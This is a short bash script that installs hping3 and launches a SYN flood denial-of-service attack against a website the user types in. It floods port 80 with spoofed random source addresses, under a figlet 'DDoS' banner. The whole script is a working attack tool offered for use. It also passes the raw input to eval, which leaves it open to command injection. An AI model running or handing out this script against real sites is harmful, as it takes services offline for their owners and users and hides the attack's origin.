#!/usr/bin/env bash

#You need a system with apt support and root access for this.

apt install hping3
apt install figlet
clear

figlet DDoS
echo "Just the domain name, without the http/https and without the trailing slash"
read -p "[URL Website for DDoS]: " url

eval "hping3 -S -p 80 --flood --rand-source $url"
